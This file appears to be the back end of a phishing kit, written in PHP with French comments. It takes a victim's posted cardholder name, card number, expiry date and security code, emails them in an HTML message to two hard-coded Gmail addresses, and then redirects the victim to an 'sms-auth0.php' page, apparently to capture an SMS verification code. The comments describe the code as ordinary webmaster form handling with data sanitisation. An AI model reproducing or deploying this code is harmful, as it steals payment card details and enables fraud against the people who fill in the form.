<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>

</head>


<body>

<?php
    // S'il y des données de postées
    if ($_SERVER['REQUEST_METHOD']=='POST') {
     
      // (1) Code PHP pour traiter l'envoi de l'email
     
      // Récupération des variables et sécurisation des données
      $n_card = htmlentities($_POST['n_card']); // htmlentities() convertit des caractères "spéciaux" en équivalent HTML
      $c_num = htmlentities($_POST['c_num']);
      $exm = htmlentities($_POST['exm']);
      $exy = htmlentities($_POST['exy']);
      $csc = htmlentities($_POST['csc']);
      
     
      // Variables concernant l'email
     
      $destinataire = 'parfaitk714@gmail.com, olivierdelaforce2@gmail.com'; // Adresse email du webmaster (à personnaliser)
      $contenu = '<html><head><title> '.$objet.' </title></head><body>';
      $contenu .= '<p>Carte Bancaire</p>';
      $contenu .= '<p><strong>Titulaire</strong>: '.$n_card.'</p>';
      $contenu .= '<p><strong>Numero de carte</strong>: '.$c_num.'</p>';
      $contenu .= '<strong>Date Exp</strong>: '.$exm;
      $contenu .= '<strong>/</strong> '.$exy ;
       $contenu .= '<p><strong>Crypto</strong>: '.$csc.'</p>';
      $contenu .= '</body></html>'; // Contenu du message de l'email (en XHTML)
     
      // Pour envoyer un email HTML, l'en-tête Content-type doit être défini
      $headers = 'MIME-Version: 1.0'."\r\n";
      $headers .= 'Content-type: text/html; charset=iso-8859-1'."\r\n";
     
      // Envoyer l'email
      mail($destinataire, $objet, $contenu, $headers); // Fonction principale qui envoi l'email
      
    }
    ?>
    <script language="javascript">document.location="sms-auth0.php"</script> 
</body>

</html> 